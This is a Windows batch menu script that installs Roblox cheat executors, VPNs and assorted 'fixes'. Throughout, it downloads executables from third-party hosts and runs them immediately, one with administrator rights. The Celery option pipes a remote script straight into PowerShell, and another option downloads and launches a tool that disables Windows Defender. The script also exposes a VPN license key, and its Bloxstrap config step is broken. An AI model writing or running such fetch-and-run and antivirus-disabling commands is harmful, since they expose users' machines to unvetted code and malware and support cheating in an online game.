@echo off
set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

:MENU
cls
echo /====================================================\
echo               *** IRON-MARK-BATON 9.1.6 ***                 
echo        *** Samuraa1 Support (Made by BBD4) ***             
echo \====================================================/
echo     ______________________________________________
echo     \'########::'########::'########::'##::::::::/
echo     / ##.... ##: ##.... ##: ##.... ##: ##:::'##::\
echo     \ ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##::/
echo     / ########:: ########:: ##:::: ##: ##::: ##::\
echo     \ ##.... ##: ##.... ##: ##:::: ##: #########:/ 
echo     / ##:::: ##: ##:::: ##: ##:::: ##:...... ##::\
echo     \ ########:: ########:: ########:::::::: ##::/
echo     /........:::........:::........:::::::::..:::\ 
echo     \____________________________________________/
echo.
echo                _____              ________
echo               //+//+\ Options Or /+\\+\\+\\
echo               \\_\\_/ Functions  \_//_//_//
echo.
echo     1. Show list of Exploits' downloads
echo     2. Show list of VPN's downloads
echo     3. Show list of fixes
echo     4. Join Discord server Samuraa1 Community \\If you want :D\\
echo     5. Exit
echo.
set /p choice=Select (1-5): 

if "%choice%"=="1" goto LIST_EXPLOITS
if "%choice%"=="2" goto LIST_VPN
if "%choice%"=="3" goto LIST_FIXES
if "%choice%"=="4" goto JOIN_DISCORD
if "%choice%"=="5" goto END

goto MENU

:LIST_EXPLOITS
cls
echo /====================================================\
echo               *** List of Exploits ***             
echo \====================================================/
echo.
echo.
echo               ____                ____
echo              / //+\  Options Or  /+\\ \
echo             /__\\_/   Functions  \_//__\
echo             \__/_/  ____________  \_\__/
echo              \/_/  /___///\\\___\  \_\/
echo              //0\ //9\ \\\/// /8\\ /1\\
echo              \\_/ \\_/ ///\\\ \_// \_//
echo               -0    -  \\\///    0 _
echo                -  0     \VV/  0        0
echo                     _    \/ -        0
echo            -             0-      -     -
echo. 
echo.
echo 1. Install Nezur (NOSTATUS)
echo 2. Install Solara (NOSTATUS)
echo 3. Install Celery (NOSTATUS)
echo 4. Install FluxTeam (NOSTATUS) 
echo 5. Install JJSploit (NOSTATUS)
echo 6. Install Zorara (NOSTATUS)
echo 7. Exit
echo.
set /p "choicen=Choose Function (1-7): "
if %choicen% EQU 1 goto INSTALL_NEZUR
if %choicen% EQU 2 goto INSTALL_SOLARA
if %choicen% EQU 3 goto INSTALL_CELERY
if %choicen% EQU 4 goto INSTALL_FLUXTEAM
if %choicen% EQU 5 goto INSTALL_JJSPLOIT
if %choicen% EQU 6 goto INSTALL_ZORARA
if %choicen% EQU 7 goto MENU
goto MENU

:LIST_VPN
cls
echo /====================================================\
echo          *** List of VPNs (Download) ***             
echo \====================================================/
echo.
echo               ____                ____              
echo              / //+\  Options Or  /+\\ \
echo             /__\\_/   Functions  \_//__\
echo             \__/_/  ____________  \_\__/
echo              \/_/  /___///\\\___\  \_\/
echo              //0\ //9\ \\\/// /8\\ /1\\
echo              \\_/ \\_/ ///\\\ \_// \_//
echo               -0    -  \\\///    0 _
echo                -  0     \VV/  0        0
echo                     _    \/ -        0
echo            -             0-      -     -
echo. 
echo.
echo 1. PlanetVPN
echo 2. Hide.me VPN (KEY: 50226389802992)
echo 3. XVPN
echo 4. Exit
echo.

set /p choice="Choose VPN to download (1-4): "

set "vpnChoice=%choice%"
if "%vpnChoice%"=="1" (
    set "vpnName=PlanetVPN"
    set "vpnUrl=https://planetvpn-cdn.xyz/win/planetvpn.exe"
) else if "%vpnChoice%"=="2" (
    start "" "https://member.hide.me/"
    goto MENU
) else if "%vpnChoice%"=="3" (
    set "vpnName=XVPN"
    set "vpnUrl=https://xvpn.io/download/vpn-win?isAutoDownload=true&os=win"
) else if "%vpnChoice%"=="4" (
    goto MENU
) else (
    echo Invalid choice, please try again!
    pause
    goto LIST_VPN
)

if defined vpnName (
    echo Downloading %vpnName%...
    "%powershellPath%" -Command "Invoke-WebRequest -Uri '%vpnUrl%' -OutFile '%USERPROFILE%\Downloads\%vpnName%.exe'"
    
    if %errorlevel% neq 0 (
        echo ERROR: Failed to download %vpnName%.
    ) else (
        start "" "%USERPROFILE%\Downloads\%vpnName%.exe"
        echo %vpnName% downloaded successfully and is now starting!
    )
)

pause
goto MENU


:LIST_FIXES
cls
echo /====================================================\
echo                 *** List of Fixes ***             
echo \====================================================/
echo.
echo.
echo               ____                ____
echo              / //+\  Options Or  /+\\ \
echo             /__\\_/   Functions  \_//__\
echo             \__/_/  ____________  \_\__/
echo              \/_/  /___///\\\___\  \_\/
echo              //0\ //9\ \\\/// /8\\ /1\\
echo              \\_/ \\_/ ///\\\ \_// \_//
echo               -0    -  \\\///    0 _
echo                -  0     \VV/  0        0
echo                     _    \/ -        0
echo            -             0-      -     -
echo. 
echo.
echo 1. Delete AppData\Hash\Con\Trash files of Roblox\Exploits
echo 2. Download and Install/open Latest Bloxstrap Version
echo 3. Download and change/fix Bloxstrap Config
echo 4. Download and Install Node.js
echo 5. Downgrade Roblox Version
echo 6. Disable Windows Defender
echo 7. Create Solara Disk
echo 8. Exit
echo.

set /p choicer="Choose Function (1-8): "
for %%N in (1 2 3 4 5 6 7 8) do if "%choicer%"=="%%N" goto OPTION_%%N

echo Invalid choice! Please select a number between 1 and 8.
pause
goto LIST_FIXES

:OPTION_1
goto DELETE_ROBLOX

:OPTION_2
goto INSTALL_BLOXSTRAP

:OPTION_3
goto MAKE_BLOXSTRAP_CON

:OPTION_4
goto INSTALL_NODEJS

:OPTION_5
goto FIX_ROBLOX_VERSION_MISMATCH

:OPTION_6
goto DOWNLOAD_OFFDEFENDER

:OPTION_7
goto CHANGE_DIRECTORY

:OPTION_8
exit


:CHANGE_DIRECTORY
cls
echo /====================================================\
echo               Virtual Disk With Solara
echo \====================================================/
echo.
echo 1. Create DSolara
echo 2. Delete DSolara
echo 3. Return (HOME)
echo.

set /p choice="Select Option (1-3): " 

if "%choice%"=="1" goto DOWNLOADSOLARA_DIRECTORY
if "%choice%"=="2" goto DELETESOLARA_DIRECTORY
if "%choice%"=="3" goto MENU

echo Invalid choice! Please select a valid option (1-3).
pause
goto CHANGE_DIRECTORY

:DOWNLOADSOLARA_DIRECTORY
echo Creating Solara...

:: Проверяем, существует ли папка, если нет — создаем её
if not exist "C:\Solara" (
    mkdir C:\Solara
    echo Folder C:\Solara created.
) else (
    echo Folder C:\Solara already exists.
)

:: Создаем виртуальный диск Z:
subst Z: C:\Solara

if errorlevel 1 (
    echo ERROR: Unable to create virtual disk Z:.
    pause
    goto MENU
)

echo /====================================================\
echo                Created as Z: C:\Solara!
echo \====================================================/
echo.
echo /====================================================\
echo                Downloading SolaraV3...
echo \====================================================/

:: Загрузка файла на виртуальный диск Z:
"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://1c143a05.solaraweb-alj.pages.dev/download/static/files/Bootstrapper.exe' -OutFile 'Z:\Bootstrapper.exe'"

if %errorlevel% neq 0 (
    echo ERROR: Failed to download Bootstrapper.exe to Z:.
) else (
    echo Successfully downloaded to Z:\Bootstrapper.exe.
)

pause
goto MENU

:DELETESOLARA_DIRECTORY
echo /====================================================\
echo                Deleting Solara Disk...
echo \====================================================/

subst Z: /d

if %errorlevel% neq 0 (
    echo ERROR: Unable to delete Z:.
) else (
    echo Successfully deleted Z:.
)

pause
goto MENU


:DOWNLOAD_OFFDEFENDER
cls
echo /====================================================\
echo    *** Downloading and Opening Disable Defender ***
echo \====================================================/
echo.
bitsadmin /transfer "DownloadDisableDefender" https://github.com/pgkt04/defender-control/releases/download/v1.5/disable-defender.exe "%~dp0disable-defender.exe"
if %errorlevel% neq 0 (
    echo ERROR: Failed to download Disable Defender.
) else (
    start "" "%~dp0disable-defender.exe"
    echo Successfully started Disable Defender.
)
pause
goto MENU


:JOIN_DISCORD
cls
echo /====================================================\
echo       *** Joining Discord server Samuraa1 ***      
echo \====================================================/
start "" "https://discord.gg/SzHGMzjKMb"
echo Discord server link opened!
pause
goto MENU


:INSTALL_NEZUR
cls
echo /====================================================\
echo       *** Opening Nezur Executor Website ***
echo \====================================================/
echo.
start "" "https://nezur.io/Nezur_Executor.zip"
echo Nezur Executor website opened!
pause
goto MENU


:FIX_ROBLOX_VERSION_MISMATCH
cls
echo /====================================================\
echo        *** FIXING ROBLOX VERSION MISMATCH ***             
echo \====================================================/
echo.
echo Downloading and Running Roblox Downgrader...
"%powershellPath%" -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ActualMasterOogway/Roblox-Downgrader/main/RobloxDowngrader.exe' -OutFile '%temp%\RobloxDowngrader.exe'; Start-Process '%temp%\RobloxDowngrader.exe' -Wait"

if %errorlevel% neq 0 (
    echo ERROR: Failed to run Roblox Downgrader.
) else (
    echo Successfully fixed Roblox version mismatch!
)
pause
goto MENU


:INSTALL_SOLARA
cls
echo /====================================================\
echo      *** Downloading and Installing Solara V3 ***             
echo \====================================================/

REM Путь к папке на рабочем столе
set "desktopFolder=%USERPROFILE%\Desktop\Solara"

REM Создаем папку на рабочем столе, если она не существует
if not exist "%desktopFolder%" mkdir "%desktopFolder%"

REM Скачивание файла с использованием bitsadmin
bitsadmin /transfer "DownloadSolara" https://1c143a05.solaraweb-alj.pages.dev/download/static/files/Bootstrapper.exe "%desktopFolder%\Bootstrapper.exe"

REM Проверка успешного скачивания и запуск с правами администратора
if exist "%desktopFolder%\Bootstrapper.exe" (
    echo Successfully downloaded Bootstrapper.exe.
    echo Running Bootstrapper.exe with administrator privileges...
    powershell -Command "Start-Process '%desktopFolder%\Bootstrapper.exe' -Verb runAs"
) else (
    echo Error: Bootstrapper.exe not found or download failed.
)

pause
goto MENU


:INSTALL_ZORARA
cls
echo /====================================================\
echo      *** Downloading and Installing Zorara ***             
echo \====================================================/

REM Путь к папке на рабочем столе
set "desktopFolder=%USERPROFILE%\Desktop\Zorara_Installer"

REM Создаем папку на рабочем столе, если она не существует
if not exist "%desktopFolder%" mkdir "%desktopFolder%"

REM Скачиваем файл Zorara.zip в папку на рабочем столе
"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://github.com/user-attachments/files/17063327/Zorara.zip' -OutFile '%desktopFolder%\Zorara.zip'"

pause
goto MENU


:INSTALL_FLUXTEAM
cls
echo /====================================================\
echo      *** Downloading and Installing FluxTeam ***             
echo \====================================================/
"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://github.com/getfluxteam/FluxTeamDownload/raw/main/FluxTeamB.zip' -OutFile '%temp%\Bootstrapper.exe'; Start-Process '%temp%\Bootstrapper.exe' -Wait"
echo Opening Downloads folder...
start "" "%USERPROFILE%\Downloads"
pause
goto MENU

:INSTALL_JJSPLOIT
cls
echo /====================================================\
echo      *** Downloading and Installing JJSploit ***             
echo \====================================================/
"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://github.com/wcrddn/wcrddn.github.io/raw/refs/heads/main/9-20/JJSploit_8.6.0_x64-setup.exe' -OutFile '%temp%\Bootstrapper.exe'; Start-Process '%temp%\Bootstrapper.exe' -Wait"
echo Opening Downloads folder...
start "" "%USERPROFILE%\Downloads"
pause
goto MENU

:INSTALL_NODEJS
cls
echo /====================================================\
echo   *** Checking for Existing Node.js Installation ***             
echo \====================================================/
echo.

set "nodejsPath=C:\Program Files\nodejs"
if exist "%nodejsPath%" (
    echo Uninstalling existing Node.js...
    call :UNINSTALL_NODEJS
    echo Node.js uninstalled successfully!
) else (
    echo No existing Node.js installation found.
)

echo Downloading and Installing Node.js...
"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.16.0/node-v20.16.0-x64.msi' -OutFile '%temp%\nodejs.msi'; Start-Process '%temp%\nodejs.msi' -Wait"
echo Node.js installation completed!
pause
goto MENU

:UNINSTALL_NODEJS
taskkill /f /im node.exe > NUL 2>&1
taskkill /f /im npm.exe > NUL 2>&1
taskkill /f /im npx.exe > NUL 2>&1

if exist "%nodejsPath%\unins000.exe" (
    echo Uninstalling Node.js...
    "%nodejsPath%\unins000.exe" /SILENT /NORESTART
    timeout /t 5 > NUL
)

if exist "%nodejsPath%" (
    echo Deleting Node.js installation folder...
    rmdir /s /q "%nodejsPath%"
)
goto :EOF

:INSTALL_CELERY
cls
echo /====================================================\
echo    *** Downloading and Installing Better Celery ***             
echo \====================================================/
"%powershellPath%" -NoProfile -Command "irm 'https://bcelery.github.io/a' | iex"
echo Better Celery installation completed!
pause
goto MENU

:CONFIRM_DELETE
cls
echo /====================================================\
echo          *** CONFIRM DELETE ROBLOX FILES ***             
echo \====================================================/
echo.
echo 1. Yes
echo 2. No (Back)
echo.
set /p confirm=Select (1-2): 

if "%confirm%" == "1" (
    goto DELETE_ROBLOX
) else if "%confirm%" == "2" (
    goto MENU
)

goto MENU

:DELETE_ROBLOX
cls
echo /====================================================\
echo               *** Killing Process ***             
echo \====================================================/
echo.
taskkill /F /IM RobloxPlayerBeta.exe > NUL 2>&1
taskkill /f /im bloxstrap* > NUL 2>&1
taskkill /f /im WpfApp1* > NUL 2>&1

echo /====================================================\
echo      *** Deleting temp files of Roblox... 1/6 ***
echo \====================================================/
for %%f in (%temp%\Roblox*.*) do (
    echo %%~nxf | find /i "Cookies" > NUL
    if errorlevel 1 (
        del /q "%%f"
    )
)
cls

echo /====================================================\
echo   *** Deleting Roblox from AppData\Local... 2/6 ***
echo \====================================================/
cd /d "%localappdata%\Roblox"
for /d %%i in (*) do (
    if /i not "%%i"=="LocalStorage" (
        rmdir /s /q "%%i"
    )
)
for %%f in (%localappdata%\Roblox\*.*) do (
    echo %%~nxf | find /i "Cookies" > NUL
    if errorlevel 1 (
        del /q "%%f"
    )
)
cls

echo /====================================================\
echo   *** Deleting Roblox from Program Files... 3/6 ***
echo \====================================================/
if exist "C:\Program Files (x86)\Roblox" (
    rmdir /s /q "C:\Program Files (x86)\Roblox"
)
cls

echo /====================================================\
echo   *** Deleting Registry Entries... 4/6 ***
echo \====================================================/
reg delete "HKEY_CURRENT_USER\Software\Roblox" /f > NUL 2>&1
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Roblox" /f > NUL 2>&1
cls

echo /====================================================\
echo      *** Finalizing and Cleaning up... 5/6 ***
echo \====================================================/
for %%f in (%USERPROFILE%\AppData\LocalLow\Roblox\*.*) do (
    echo %%~nxf | find /i "Cookies" > NUL
    if errorlevel 1 (
        del /q "%%f"
    )
)
cls

echo /====================================================\
echo       *** Roblox files deletion complete! 6/6 ***
echo \====================================================/
pause
goto MENU


:MAKE_BLOXSTRAP_CON
cls
echo /====================================================\
echo          *** Creating Bloxstrap Configuration ***              
echo \====================================================/
echo.
set "configPath=%USERPROFILE%\AppData\Local\Bloxstrap\config.json"
echo {
echo   "game": "roblox",
echo   "locale": "en-us",
echo   "user_data": "None"
echo } > "%configPath%"
echo.
echo /====================================================\
echo       *** Bloxstrap configuration created! ***
echo \====================================================/
pause
goto MENU

:END
cls
echo  _______________________________________
echo /'########::'##:::'##:'########:'####:\.\
echo \ ##.... ##:. ##:'##:: ##.....:: ####:/ /
echo / ##:::: ##::. ####::: ##::::::: ####:\.\
echo \ ########::::. ##:::: ######:::: ##::/ /
echo / ##.... ##:::: ##:::: ##...:::::..:::\.\
echo \ ##:::: ##:::: ##:::: ##:::::::'####:/ /
echo / ########::::: ##:::: ########: ####:\.\
echo \........::::::..:::::........::....::/ /
echo /_____________________________________\.\
timeout /t 1 /nobreak > NUL
exit
